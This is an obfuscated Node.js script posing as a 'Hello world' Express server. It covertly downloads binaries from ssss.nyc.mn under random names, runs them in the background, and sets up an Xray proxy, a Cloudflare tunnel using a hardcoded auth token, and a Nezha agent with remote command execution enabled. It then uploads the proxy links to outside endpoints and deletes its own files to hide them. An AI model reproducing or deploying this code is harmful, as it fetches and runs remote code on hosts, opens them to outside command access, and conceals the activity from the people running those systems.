const _0x4d28e1=_0x4ee3;(function(_0x1c4a3d,_0x43b90a){const _0x59f5e7=_0x4ee3,_0x3851d7=_0x1c4a3d();while(!![]){try{const _0x1863e7=parseInt(_0x59f5e7(0x16e))/0x1*(-parseInt(_0x59f5e7(0x1de))/0x2)+parseInt(_0x59f5e7(0x176))/0x3*(parseInt(_0x59f5e7(0x219))/0x4)+-parseInt(_0x59f5e7(0x1a3))/0x5*(-parseInt(_0x59f5e7(0x21c))/0x6)+-parseInt(_0x59f5e7(0x1cd))/0x7+parseInt(_0x59f5e7(0x1c7))/0x8+-parseInt(_0x59f5e7(0x206))/0x9*(parseInt(_0x59f5e7(0x1a6))/0xa)+parseInt(_0x59f5e7(0x1c3))/0xb*(-parseInt(_0x59f5e7(0x21a))/0xc);if(_0x1863e7===_0x43b90a)break;else _0x3851d7['push'](_0x3851d7['shift']());}catch(_0x2ace17){_0x3851d7['push'](_0x3851d7['shift']());}}}(_0x3fd3,0x6d307));const express=require(_0x4d28e1(0x1fd)),app=express(),axios=require(_0x4d28e1(0x1b6)),os=require('os'),fs=require('fs'),path=require(_0x4d28e1(0x1a9)),{promisify}=require(_0x4d28e1(0x1e9)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x4d28e1(0x194)),UPLOAD_URL=process[_0x4d28e1(0x21b)][_0x4d28e1(0x180)]||'',PROJECT_URL=process[_0x4d28e1(0x21b)][_0x4d28e1(0x18e)]||'',AUTO_ACCESS=process[_0x4d28e1(0x21b)][_0x4d28e1(0x1ca)]||![],FILE_PATH=process[_0x4d28e1(0x21b)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x4d28e1(0x21b)][_0x4d28e1(0x20e)]||_0x4d28e1(0x211),PORT=process[_0x4d28e1(0x21b)][_0x4d28e1(0x174)]||process['env'][_0x4d28e1(0x1e6)]||0xbb8,UUID=process[_0x4d28e1(0x21b)]['UUID']||_0x4d28e1(0x214),NEZHA_SERVER=process['env'][_0x4d28e1(0x220)]||'',NEZHA_PORT=process[_0x4d28e1(0x21b)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x4d28e1(0x222)]||'',ARGO_DOMAIN=process[_0x4d28e1(0x21b)]['ARGO_DOMAIN']||'lwnf.zvvip.netlib.re',ARGO_AUTH=process['env'][_0x4d28e1(0x1fa)]||'eyJhIjoiMTZjY2U0NmQ3MjAyZjZhMWMzNzc0NTQwZTU0ZjQzN2QiLCJ0IjoiYTgyMGE4YTItNTA0OS00YmU5LWFkYjAtZmFlNzBlMDU1YjBhIiwicyI6Ik1qZzBZbVU0TkRJdE9XRXdNUzAwTVdFeUxXSmpOamN0TURJMlkyVmxaV0l4TURObSJ9',ARGO_PORT=process[_0x4d28e1(0x21b)][_0x4d28e1(0x1b9)]||0x1f41,CFIP=process[_0x4d28e1(0x21b)]['CFIP']||_0x4d28e1(0x1ed),CFPORT=process['env'][_0x4d28e1(0x16a)]||0x88bd,NAME=process[_0x4d28e1(0x21b)][_0x4d28e1(0x1ee)]||_0x4d28e1(0x197);!fs['existsSync'](FILE_PATH)?(fs[_0x4d28e1(0x1be)](FILE_PATH),console[_0x4d28e1(0x1a4)](FILE_PATH+'\x20is\x20created')):console[_0x4d28e1(0x1a4)](FILE_PATH+_0x4d28e1(0x193));function generateRandomName(){const _0x4ee7c3=_0x4d28e1,_0x4ef10d='abcdefghijklmnopqrstuvwxyz';let _0xa47a63='';for(let _0x18b613=0x0;_0x18b613<0x6;_0x18b613++){_0xa47a63+=_0x4ef10d[_0x4ee7c3(0x1da)](Math['floor'](Math[_0x4ee7c3(0x182)]()*_0x4ef10d['length']));}return _0xa47a63;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4d28e1(0x1bd)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x4d28e1(0x1bd)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x4d28e1(0x195)),listPath=path[_0x4d28e1(0x1bd)](FILE_PATH,_0x4d28e1(0x1a5)),bootLogPath=path[_0x4d28e1(0x1bd)](FILE_PATH,_0x4d28e1(0x19b)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x5ea1b7=_0x4d28e1;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x545ca7;try{_0x545ca7=fs['readFileSync'](subPath,_0x5ea1b7(0x196));}catch{return null;}const _0x1dba9e=Buffer[_0x5ea1b7(0x221)](_0x545ca7,_0x5ea1b7(0x187))[_0x5ea1b7(0x1d4)](_0x5ea1b7(0x196)),_0x2e5094=_0x1dba9e[_0x5ea1b7(0x223)]('\x0a')[_0x5ea1b7(0x218)](_0x300800=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5ea1b7(0x20d)](_0x300800));if(_0x2e5094['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x5ea1b7(0x210),JSON[_0x5ea1b7(0x1bb)]({'nodes':_0x2e5094}),{'headers':{'Content-Type':_0x5ea1b7(0x1f5)}})[_0x5ea1b7(0x1fe)](_0x25b061=>{return null;}),null;}catch(_0x43855e){return null;}}function cleanupOldFiles(){const _0x176e2e=_0x4d28e1;try{const _0x225d45=fs[_0x176e2e(0x1ad)](FILE_PATH);_0x225d45[_0x176e2e(0x1db)](_0x67f09f=>{const _0x1a3671=_0x176e2e,_0x52725d=path[_0x1a3671(0x1bd)](FILE_PATH,_0x67f09f);try{const _0x5bbd10=fs[_0x1a3671(0x1b3)](_0x52725d);_0x5bbd10[_0x1a3671(0x1e7)]()&&fs['unlinkSync'](_0x52725d);}catch(_0x406cbf){}});}catch(_0x230eea){}}app[_0x4d28e1(0x204)]('/',function(_0x3523a,_0x2481fb){const _0x265655=_0x4d28e1;_0x2481fb['send'](_0x265655(0x190));});async function generateConfig(){const _0x2952e2=_0x4d28e1,_0x4b3d51={'log':{'access':_0x2952e2(0x200),'error':_0x2952e2(0x200),'loglevel':_0x2952e2(0x18d)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2952e2(0x1f3)}],'decryption':_0x2952e2(0x18d),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2952e2(0x19e)}},{'port':0xbb9,'listen':_0x2952e2(0x1e2),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x2952e2(0x18d)},'streamSettings':{'network':'tcp','security':_0x2952e2(0x18d)}},{'port':0xbba,'listen':_0x2952e2(0x1e2),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2952e2(0x18d)},'streamSettings':{'network':'ws','security':_0x2952e2(0x18d),'wsSettings':{'path':_0x2952e2(0x1ef)}},'sniffing':{'enabled':!![],'destOverride':[_0x2952e2(0x20a),_0x2952e2(0x1d2),_0x2952e2(0x21f)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2952e2(0x1e2),'protocol':_0x2952e2(0x172),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2952e2(0x1e0)}},'sniffing':{'enabled':!![],'destOverride':[_0x2952e2(0x20a),_0x2952e2(0x1d2),_0x2952e2(0x21f)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x2952e2(0x1cb),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2952e2(0x173)}},'sniffing':{'enabled':!![],'destOverride':[_0x2952e2(0x20a),_0x2952e2(0x1d2),_0x2952e2(0x21f)],'metadataOnly':![]}}],'dns':{'servers':[_0x2952e2(0x1e5)]},'outbounds':[{'protocol':_0x2952e2(0x1ba),'tag':'direct'},{'protocol':'blackhole','tag':_0x2952e2(0x17c)}]};fs[_0x2952e2(0x192)](path[_0x2952e2(0x1bd)](FILE_PATH,_0x2952e2(0x177)),JSON[_0x2952e2(0x1bb)](_0x4b3d51,null,0x2));}function getSystemArchitecture(){const _0x2219fb=_0x4d28e1,_0x2388e4=os[_0x2219fb(0x1cc)]();return _0x2388e4===_0x2219fb(0x16d)||_0x2388e4===_0x2219fb(0x189)||_0x2388e4===_0x2219fb(0x185)?_0x2219fb(0x16d):'amd';}function downloadFile(_0x232c5f,_0x405161,_0x5c08a2){const _0x51a4ec=_0x4d28e1,_0x271562=_0x232c5f;!fs[_0x51a4ec(0x1b8)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x50f4f3=fs[_0x51a4ec(0x216)](_0x271562);axios({'method':_0x51a4ec(0x204),'url':_0x405161,'responseType':_0x51a4ec(0x184)})[_0x51a4ec(0x1ae)](_0x2d47fe=>{const _0x5fd048=_0x51a4ec;_0x2d47fe[_0x5fd048(0x1e4)]['pipe'](_0x50f4f3),_0x50f4f3['on'](_0x5fd048(0x19a),()=>{const _0x45c473=_0x5fd048;_0x50f4f3[_0x45c473(0x202)](),console[_0x45c473(0x1a4)]('Download\x20'+path['basename'](_0x271562)+_0x45c473(0x1af)),_0x5c08a2(null,_0x271562);}),_0x50f4f3['on'](_0x5fd048(0x1d7),_0x59f4ee=>{const _0x7eb041=_0x5fd048;fs[_0x7eb041(0x18f)](_0x271562,()=>{});const _0x9057fe='Download\x20'+path['basename'](_0x271562)+'\x20failed:\x20'+_0x59f4ee[_0x7eb041(0x199)];console[_0x7eb041(0x1d7)](_0x9057fe),_0x5c08a2(_0x9057fe);});})[_0x51a4ec(0x1fe)](_0x182237=>{const _0x3b536e=_0x51a4ec,_0x3bf507=_0x3b536e(0x186)+path['basename'](_0x271562)+_0x3b536e(0x1ff)+_0x182237[_0x3b536e(0x199)];console['error'](_0x3bf507),_0x5c08a2(_0x3bf507);});}async function downloadFilesAndRun(){const _0x29b65c=_0x4d28e1,_0x16789a=getSystemArchitecture(),_0x584c10=getFilesForArchitecture(_0x16789a);if(_0x584c10[_0x29b65c(0x213)]===0x0){console['log'](_0x29b65c(0x1ce));return;}const _0x1347de=_0x584c10[_0x29b65c(0x19d)](_0x27c161=>{return new Promise((_0x8cdce1,_0x1702eb)=>{const _0xb61865=_0x4ee3;downloadFile(_0x27c161[_0xb61865(0x1eb)],_0x27c161[_0xb61865(0x1ea)],(_0x2d701b,_0x15d8ef)=>{_0x2d701b?_0x1702eb(_0x2d701b):_0x8cdce1(_0x15d8ef);});});});try{await Promise[_0x29b65c(0x183)](_0x1347de);}catch(_0xc6e9e9){console['error'](_0x29b65c(0x17f),_0xc6e9e9);return;}function _0x2567fc(_0x33b837){const _0x5b18fc=0x1fd;_0x33b837['forEach'](_0x478837=>{const _0xf237b2=_0x4ee3;fs[_0xf237b2(0x1b8)](_0x478837)&&fs['chmod'](_0x478837,_0x5b18fc,_0x357f68=>{const _0x216d8d=_0xf237b2;_0x357f68?console[_0x216d8d(0x1d7)](_0x216d8d(0x167)+_0x478837+':\x20'+_0x357f68):console[_0x216d8d(0x1a4)]('Empowerment\x20success\x20for\x20'+_0x478837+':\x20'+_0x5b18fc[_0x216d8d(0x1d4)](0x8));});});}const _0x380d3d=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2567fc(_0x380d3d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1019cd=NEZHA_SERVER[_0x29b65c(0x19f)](':')?NEZHA_SERVER['split'](':')[_0x29b65c(0x18b)]():'',_0x58de9d=new Set([_0x29b65c(0x17e),_0x29b65c(0x1f9),_0x29b65c(0x1d6),_0x29b65c(0x198),_0x29b65c(0x1d9),_0x29b65c(0x191)]),_0x5b41d3=_0x58de9d[_0x29b65c(0x169)](_0x1019cd)?_0x29b65c(0x1e3):_0x29b65c(0x166),_0x5a5021=_0x29b65c(0x215)+NEZHA_KEY+_0x29b65c(0x1cf)+NEZHA_SERVER+_0x29b65c(0x168)+_0x5b41d3+_0x29b65c(0x1bf)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x29b65c(0x209)),_0x5a5021);const _0x49c135='nohup\x20'+phpPath+_0x29b65c(0x16c)+FILE_PATH+_0x29b65c(0x1a8);try{await exec(_0x49c135),console[_0x29b65c(0x1a4)](phpName+_0x29b65c(0x1ec)),await new Promise(_0x3cfbf9=>setTimeout(_0x3cfbf9,0x3e8));}catch(_0xa98b5e){console['error'](_0x29b65c(0x208)+_0xa98b5e);}}else{let _0x15ce2d='';const _0x361506=[_0x29b65c(0x17e),_0x29b65c(0x1f9),_0x29b65c(0x1d6),'2087',_0x29b65c(0x1d9),_0x29b65c(0x191)];_0x361506[_0x29b65c(0x19f)](NEZHA_PORT)&&(_0x15ce2d='--tls');const _0xe2c420=_0x29b65c(0x171)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x29b65c(0x1d3)+NEZHA_KEY+'\x20'+_0x15ce2d+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0xe2c420),console[_0x29b65c(0x1a4)](npmName+_0x29b65c(0x1ec)),await new Promise(_0x4bd964=>setTimeout(_0x4bd964,0x3e8));}catch(_0x3120fc){console[_0x29b65c(0x1d7)](_0x29b65c(0x1c1)+_0x3120fc);}}}else console[_0x29b65c(0x1a4)](_0x29b65c(0x1b0));const _0x5c9d4a=_0x29b65c(0x171)+webPath+_0x29b65c(0x175)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5c9d4a),console[_0x29b65c(0x1a4)](webName+_0x29b65c(0x1ec)),await new Promise(_0x360b31=>setTimeout(_0x360b31,0x3e8));}catch(_0x5f23cb){console[_0x29b65c(0x1d7)](_0x29b65c(0x18a)+_0x5f23cb);}if(fs['existsSync'](botPath)){let _0x39ba20;if(ARGO_AUTH[_0x29b65c(0x1f7)](/^[A-Z0-9a-z=]{120,250}$/))_0x39ba20=_0x29b65c(0x1fc)+ARGO_AUTH;else ARGO_AUTH[_0x29b65c(0x1f7)](/TunnelSecret/)?_0x39ba20=_0x29b65c(0x1f0)+FILE_PATH+_0x29b65c(0x1e1):_0x39ba20='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x29b65c(0x1ab)+ARGO_PORT;try{await exec(_0x29b65c(0x171)+botPath+'\x20'+_0x39ba20+_0x29b65c(0x1c4)),console['log'](botName+_0x29b65c(0x1ec)),await new Promise(_0x5d7daf=>setTimeout(_0x5d7daf,0x7d0));}catch(_0x1a537b){console[_0x29b65c(0x1d7)](_0x29b65c(0x16b)+_0x1a537b);}}await new Promise(_0xaf877e=>setTimeout(_0xaf877e,0x1388));}function getFilesForArchitecture(_0x5b9da3){const _0xe44c9f=_0x4d28e1;let _0x391eac;_0x5b9da3===_0xe44c9f(0x16d)?_0x391eac=[{'fileName':webPath,'fileUrl':_0xe44c9f(0x1a2)},{'fileName':botPath,'fileUrl':_0xe44c9f(0x18c)}]:_0x391eac=[{'fileName':webPath,'fileUrl':_0xe44c9f(0x17d)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x41a71c=_0x5b9da3===_0xe44c9f(0x16d)?'https://arm64.ssss.nyc.mn/agent':_0xe44c9f(0x21d);_0x391eac[_0xe44c9f(0x1fb)]({'fileName':npmPath,'fileUrl':_0x41a71c});}else{const _0x323310=_0x5b9da3===_0xe44c9f(0x16d)?_0xe44c9f(0x1d5):_0xe44c9f(0x1b4);_0x391eac[_0xe44c9f(0x1fb)]({'fileName':phpPath,'fileUrl':_0x323310});}}return _0x391eac;}function argoType(){const _0x5df7d0=_0x4d28e1;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5df7d0(0x1a4)](_0x5df7d0(0x1a1));return;}if(ARGO_AUTH[_0x5df7d0(0x19f)](_0x5df7d0(0x20c))){fs['writeFileSync'](path[_0x5df7d0(0x1bd)](FILE_PATH,_0x5df7d0(0x1f1)),ARGO_AUTH);const _0x5bbef7='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x5df7d0(0x207)+path[_0x5df7d0(0x1bd)](FILE_PATH,_0x5df7d0(0x1f1))+_0x5df7d0(0x217)+ARGO_DOMAIN+_0x5df7d0(0x20b)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x5df7d0(0x192)](path[_0x5df7d0(0x1bd)](FILE_PATH,'tunnel.yml'),_0x5bbef7);}else console[_0x5df7d0(0x1a4)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();function _0x4ee3(_0x22431b,_0x38d96b){const _0x3fd35b=_0x3fd3();return _0x4ee3=function(_0x4ee329,_0x184016){_0x4ee329=_0x4ee329-0x165;let _0x397dd7=_0x3fd35b[_0x4ee329];return _0x397dd7;},_0x4ee3(_0x22431b,_0x38d96b);}async function extractDomains(){const _0x103f30=_0x4d28e1;let _0x238234;if(ARGO_AUTH&&ARGO_DOMAIN)_0x238234=ARGO_DOMAIN,console[_0x103f30(0x1a4)]('ARGO_DOMAIN:',_0x238234),await _0x459ceb(_0x238234);else try{const _0x8be8bb=fs[_0x103f30(0x1b1)](path[_0x103f30(0x1bd)](FILE_PATH,'boot.log'),_0x103f30(0x196)),_0x285eb9=_0x8be8bb[_0x103f30(0x223)]('\x0a'),_0x90591c=[];_0x285eb9[_0x103f30(0x1db)](_0x1eda5b=>{const _0x590045=_0x103f30,_0x1c6024=_0x1eda5b[_0x590045(0x1f7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1c6024){const _0x4860f0=_0x1c6024[0x1];_0x90591c[_0x590045(0x165)](_0x4860f0);}});if(_0x90591c[_0x103f30(0x213)]>0x0)_0x238234=_0x90591c[0x0],console[_0x103f30(0x1a4)](_0x103f30(0x1f2),_0x238234),await _0x459ceb(_0x238234);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x103f30(0x1dc)](path[_0x103f30(0x1bd)](FILE_PATH,_0x103f30(0x19b)));async function _0x527fa1(){const _0x4e7599=_0x103f30;try{process['platform']===_0x4e7599(0x1ac)?await exec(_0x4e7599(0x20f)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x4e7599(0x1da)](0x0)+']'+botName[_0x4e7599(0x170)](0x1)+_0x4e7599(0x1c5));}catch(_0x20f941){}}_0x527fa1(),await new Promise(_0x331a8b=>setTimeout(_0x331a8b,0xbb8));const _0x521989=_0x103f30(0x1c2)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x521989+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x431b19=>setTimeout(_0x431b19,0xbb8)),await extractDomains();}catch(_0x4fc9d8){console[_0x103f30(0x1d7)](_0x103f30(0x16b)+_0x4fc9d8);}}}catch(_0x344895){console[_0x103f30(0x1d7)](_0x103f30(0x1d8),_0x344895);}async function _0x459ceb(_0x1b8754){const _0x44b32d=_0x103f30,_0x22439b=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x44b32d(0x196)}),_0x5709e4=_0x22439b[_0x44b32d(0x1dd)](),_0x16d6e8=NAME?NAME+'-'+_0x5709e4:_0x5709e4;return new Promise(_0x1a8fb1=>{setTimeout(()=>{const _0x5b7073=_0x4ee3,_0x2dae13={'v':'2','ps':''+_0x16d6e8,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x5b7073(0x18d),'host':_0x1b8754,'path':_0x5b7073(0x1c8),'tls':'tls','sni':_0x1b8754,'alpn':'','fp':_0x5b7073(0x1a0)},_0x1e9b3e=_0x5b7073(0x16f)+UUID+'@'+CFIP+':'+CFPORT+_0x5b7073(0x1f6)+_0x1b8754+_0x5b7073(0x1c6)+_0x1b8754+_0x5b7073(0x21e)+_0x16d6e8+_0x5b7073(0x188)+Buffer[_0x5b7073(0x221)](JSON['stringify'](_0x2dae13))[_0x5b7073(0x1d4)](_0x5b7073(0x187))+_0x5b7073(0x203)+UUID+'@'+CFIP+':'+CFPORT+_0x5b7073(0x212)+_0x1b8754+_0x5b7073(0x1c6)+_0x1b8754+_0x5b7073(0x1e8)+_0x16d6e8+_0x5b7073(0x1c9);console[_0x5b7073(0x1a4)](Buffer[_0x5b7073(0x221)](_0x1e9b3e)[_0x5b7073(0x1d4)](_0x5b7073(0x187))),fs[_0x5b7073(0x192)](subPath,Buffer[_0x5b7073(0x221)](_0x1e9b3e)[_0x5b7073(0x1d4)](_0x5b7073(0x187))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x5b7073(0x204)]('/'+SUB_PATH,(_0x46fb78,_0x2122da)=>{const _0x126744=_0x5b7073,_0x183b7e=Buffer[_0x126744(0x221)](_0x1e9b3e)[_0x126744(0x1d4)](_0x126744(0x187));_0x2122da[_0x126744(0x1a7)]('Content-Type',_0x126744(0x1df)),_0x2122da[_0x126744(0x1aa)](_0x183b7e);}),_0x1a8fb1(_0x1e9b3e);},0x7d0);});}}function _0x3fd3(){const _0x38479d=['match','rm\x20-rf\x20','8443','ARGO_AUTH','unshift','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','express','catch','\x20failed:\x20','/dev/null','\x20>\x20nul\x202>&1','close','\x0a\x20\x20\x0atrojan://','get','automatic\x20access\x20task\x20added\x20successfully','2945187ImikNA','\x0a\x20\x20credentials-file:\x20','php\x20running\x20error:\x20','config.yaml','http','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','TunnelSecret','test','SUB_PATH','taskkill\x20/f\x20/im\x20','/api/delete-nodes','sub','?security=tls&sni=','length','f220d8a1-14a2-44c0-86af-4dc0d2994711','\x0aclient_secret:\x20','createWriteStream','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','filter','4gOWCdX','4260biFFLm','env','783042uBuVNv','https://amd64.ssss.nyc.mn/agent','&path=%2Fvless-argo%3Fed%3D2560#','quic','NEZHA_SERVER','from','NEZHA_KEY','split','push','false','Empowerment\x20failed\x20for\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','has','CFPORT','Error\x20executing\x20command:\x20','\x20-c\x20\x22','arm','23ZduHrD','\x0avless://','substring','nohup\x20','vmess','/trojan-argo','SERVER_PORT','\x20-c\x20','2507322BlMLLf','config.json','status','listen','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Skipping\x20adding\x20automatic\x20access\x20task','block','https://amd64.ssss.nyc.mn/web','443','Error\x20downloading\x20files:','UPLOAD_URL','del\x20/f\x20/q\x20','random','all','stream','aarch64','Download\x20','base64','\x0a\x20\x20\x0avmess://','arm64','web\x20running\x20error:\x20','pop','https://arm64.ssss.nyc.mn/bot','none','PROJECT_URL','unlink','Hello\x20world!','2053','writeFileSync','\x20already\x20exists','child_process','sub.txt','utf-8','lwnf','2087','message','finish','boot.log','http\x20server\x20is\x20running\x20on\x20port:','map','tcp','includes','firefox','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://arm64.ssss.nyc.mn/web','20PcwcDh','log','list.txt','10HSdDoI','set','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','path','send','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','win32','readdirSync','then','\x20successfully','NEZHA\x20variable\x20is\x20empty,skip\x20running','readFileSync','App\x20is\x20running','statSync','https://amd64.ssss.nyc.mn/v1','\x20>/dev/null\x202>&1','axios','Unhandled\x20error\x20in\x20startserver:','existsSync','ARGO_PORT','freedom','stringify','response','join','mkdirSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','npm\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','7975wOmxlv','\x20>/dev/null\x202>&1\x20&','\x22\x20>\x20/dev/null\x202>&1','&fp=firefox&type=ws&host=','1766720cIoECv','/vmess-argo?ed=2560','\x0a\x20\x20\x20\x20','AUTO_ACCESS','trojan','arch','2488941YKFWnY','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/api/add-nodes','clear','tls','\x20-p\x20','toString','https://arm64.ssss.nyc.mn/v1','2096','error','Error\x20reading\x20boot.log:','2083','charAt','forEach','unlinkSync','trim','16628GBuuqD','text/plain;\x20charset=utf-8','/vmess-argo','/tunnel.yml\x20run','127.0.0.1','true','data','https+local://8.8.8.8/dns-query','PORT','isFile','&path=%2Ftrojan-argo%3Fed%3D2560#','util','fileUrl','fileName','\x20is\x20running','cdns.doon.eu.org','NAME','/vless-argo','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel.json','ArgoDomain:','xtls-rprx-vision','post','application/json','?encryption=none&security=tls&sni='];_0x3fd3=function(){return _0x38479d;};return _0x3fd3();}async function uploadNodes(){const _0x3cbeb7=_0x4d28e1;if(UPLOAD_URL&&PROJECT_URL){const _0xe8e340=PROJECT_URL+'/'+SUB_PATH,_0x521043={'subscription':[_0xe8e340]};try{const _0x32fd5f=await axios[_0x3cbeb7(0x1f4)](UPLOAD_URL+'/api/add-subscriptions',_0x521043,{'headers':{'Content-Type':_0x3cbeb7(0x1f5)}});return _0x32fd5f&&_0x32fd5f['status']===0xc8?(console[_0x3cbeb7(0x1a4)]('Subscription\x20uploaded\x20successfully'),_0x32fd5f):null;}catch(_0x3c7e33){if(_0x3c7e33[_0x3cbeb7(0x1bc)]){if(_0x3c7e33['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x46a633=fs['readFileSync'](listPath,_0x3cbeb7(0x196)),_0x472f49=_0x46a633[_0x3cbeb7(0x223)]('\x0a')['filter'](_0x53107c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3cbeb7(0x20d)](_0x53107c));if(_0x472f49['length']===0x0)return;const _0x254e41=JSON['stringify']({'nodes':_0x472f49});try{const _0x4dd304=await axios[_0x3cbeb7(0x1f4)](UPLOAD_URL+_0x3cbeb7(0x1d0),_0x254e41,{'headers':{'Content-Type':_0x3cbeb7(0x1f5)}});return _0x4dd304&&_0x4dd304[_0x3cbeb7(0x178)]===0xc8?(console[_0x3cbeb7(0x1a4)]('Nodes\x20uploaded\x20successfully'),_0x4dd304):null;}catch(_0xbad65c){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x52bc31=_0x4ee3,_0x555f35=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x555f35[_0x52bc31(0x165)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x555f35[_0x52bc31(0x165)](phpPath);process['platform']==='win32'?exec(_0x52bc31(0x181)+_0x555f35[_0x52bc31(0x1bd)]('\x20')+_0x52bc31(0x201),_0x439038=>{const _0x3eaf2e=_0x52bc31;console['clear'](),console[_0x3eaf2e(0x1a4)](_0x3eaf2e(0x1b2)),console[_0x3eaf2e(0x1a4)](_0x3eaf2e(0x17a));}):exec(_0x52bc31(0x1f8)+_0x555f35[_0x52bc31(0x1bd)]('\x20')+_0x52bc31(0x1b5),_0x2b8f5e=>{const _0x4a69ad=_0x52bc31;console[_0x4a69ad(0x1d1)](),console['log'](_0x4a69ad(0x1b2)),console[_0x4a69ad(0x1a4)](_0x4a69ad(0x17a));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x298a0c=_0x4d28e1;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x298a0c(0x1a4)](_0x298a0c(0x17b));return;}try{const _0x24f81a=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x298a0c(0x1f5)}});return console[_0x298a0c(0x1a4)](_0x298a0c(0x205)),_0x24f81a;}catch(_0x3d03e2){return console[_0x298a0c(0x1d7)](_0x298a0c(0x1c0)+_0x3d03e2['message']),null;}}async function startserver(){const _0x301d08=_0x4d28e1;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4b0397){console[_0x301d08(0x1d7)]('Error\x20in\x20startserver:',_0x4b0397);}}startserver()[_0x4d28e1(0x1fe)](_0x13105e=>{const 